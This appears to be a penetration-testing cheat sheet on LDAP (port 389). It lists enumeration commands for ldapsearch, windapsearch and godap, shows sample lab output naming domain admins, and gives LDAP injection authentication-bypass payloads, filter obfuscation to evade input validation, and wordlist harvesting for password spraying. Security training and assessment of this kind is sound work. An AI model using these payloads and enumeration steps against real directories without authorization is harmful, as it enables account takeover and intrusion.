# LDAP Protocol (Port 389)

## Protocol Overview

**LDAP (Lightweight Directory Access Protocol)** is a protocol for accessing and managing directory information services over TCP/IP. Commonly used in Active Directory environments for:

- User authentication
- Authorization queries
- Directory enumeration
- Group membership validation

**Default Ports**: 389 (unencrypted), 636 (LDAPS/TLS), 3268 (Global Catalog)

---

## Enumeration Tools

### ldapsearch

Standard LDAP client for querying directory services.

**Basic syntax:**
```bash
ldapsearch -H ldap://target.com:389 -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"
```

**Anonymous bind (null credentials):**
```bash
ldapsearch -h 10.10.10.175 -x -s base namingcontexts
```

**Query user by email:**
```bash
ldapsearch -H ldap://ldap.example.com:389 \
  -D "cn=admin,dc=example,dc=com" \
  -w secret123 \
  -b "ou=people,dc=example,dc=com" \
  "(mail=john.doe@example.com)"
```

### windapsearch

Python tool for efficient Active Directory enumeration via LDAP.

**Enumerate Domain Admins:**
```bash
python3 windapsearch.py --dc-ip 172.16.5.5 \
  -u user@domain.local \
  -p password \
  --da
```

**Output example:**
```
[+] Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm
cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local
```

**Enumerate all privileged users:**
```bash
python3 windapsearch.py --dc-ip 172.16.5.5 \
  -u user@domain.local \
  -p password \
  -PU
```

### godap

Interactive LDAP explorer with GUI capabilities for AD reconnaissance.

**Installation:**
```bash
go install github.com/Macmod/godap@latest
```

**Usage:**
```bash
godap -u user@domain.local -p password -s ldap://dc.domain.local
```

---

## LDAP Injection

### Vulnerability Explanation

LDAP injection occurs when user input is concatenated directly into LDAP queries without proper sanitization, allowing attackers to modify query logic.

### Common Injection Characters

| Input | Purpose |
|-------|---------|
| `*` | Wildcard matching any characters |
| `()` | Expression grouping |
| `\|` | Logical OR operator |
| `&` | Logical AND operator |
| `(cn=*)` | Always-true condition |

### Authentication Bypass Examples

**Simple wildcard bypass:**
```
Username: *
Password: *
Result: (&(uid=*)(password=*))
```

**Query termination bypass:**
```
Username: *)(&
Password: anything
Result: (&(uid=*)(&)(password=anything))
```

**Object class wildcard:**
```
Username: *)(objectClass=*)
Password: ignored
```

### Detection via Nmap
```bash
nmap -p389 -sV 10.10.10.10
```

**Vulnerable service indicators:**
```
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
```

---

## LDAP Security Assessment

### LDAP Signing Verification

Check if LDAP signing is enforced:
```bash
netexec ldap DC_IP -u username -p password -M ldap-checker
```

**Implications when NOT enforced:**
- RBCD (Resource-Based Constrained Delegation) attacks
- Shadow Credentials attacks
- NTLM relay to LDAP

### Authentication Methods

| Method | Security | Use Case |
|--------|----------|----------|
| Anonymous bind | Low | Public directory access |
| Simple bind | Medium | Username/password over clear text |
| SASL | High | Kerberos or certificate-based |

---

## Advanced Techniques

### Custom Wordlist Generation

Generate targeted wordlists from LDAP directory data:
```bash
# Using pyLDAPWordlistHarvester
python3 pyLDAPWordlistHarvester.py -d domain.local -u user -p pass
```

**Output**: Usernames, email patterns, naming conventions for password spraying.

### LDAP Filter Obfuscation

Bypassing basic input validation through encoding and alternative syntax:
```
# Standard filter
(uid=admin)

# Obfuscated alternatives
(uid=\61\64\6d\69\6e)  # Hex encoding
(|(uid=admin)(cn=*))    # Logical OR
```

---
